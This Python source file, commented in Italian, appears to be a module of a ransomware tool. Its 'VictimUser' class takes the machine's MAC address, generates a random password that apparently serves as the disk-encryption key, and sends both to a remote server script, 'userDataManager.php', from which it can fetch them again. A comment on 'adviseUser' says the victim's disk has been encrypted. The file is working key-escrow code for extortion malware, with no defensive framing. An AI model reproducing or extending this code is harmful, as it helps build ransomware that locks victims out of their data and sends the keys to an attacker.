import random
import requests
import Settings
from uuid import getnode as get_mac


class VictimUser:
    userPassword = ""
    userMAC = ""

    def __init__(self):
        self.userMAC = self.getHwAddr()
        self.userPassword = self.generateRandomPassword()

    # Preleva l'indirizzo della scheda di rete
    def getHwAddr(self):
            return get_mac()

    def initUserData(self):
        if self.getUserData() == False:
            self.saveUserData()

    # Salva i dati della vittima su server, se gia' sono presenti non vengono inseriti
    def saveUserData(self):
        server_address = Settings.MyEncryptorServerAddress + "userDataManager.php"
        post_data = {'mac':self.userMAC,'psw':self.userPassword}
        res2 = requests.post(url = server_address, data = post_data)
        #risposta testuale
        res2_text = res2.text.encode('ascii','ignore')
        if res2_text == 'OK':
            return True
        return False

    # Preleva i dati della vittima dal server
    def getUserData(self):
        server_address = Settings.MyEncryptorServerAddress + "userDataManager.php"
        get_data = {'mac': self.userMAC}
        res = requests.get(url=server_address, params=get_data)
        # Torna un json con i dati dell'utente password,mac
        if res.text != 'NOT_FOUND':
            res_json_u = {unicode(k).encode("utf-8"): unicode(v).encode("utf-8") for k,v in res.json().iteritems()}
            return res_json_u
        return False

    # Avvisa l'utente che il disco e' stato crittografato
    def adviseUser(self,message):
        return True;

    # Genera un password strong alphanumeric
    def generateRandomPassword(self,len = 16):
        alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        pwd = ""
        for i in range(1,len):
            pwd += random.choice(alphabet)
        return pwd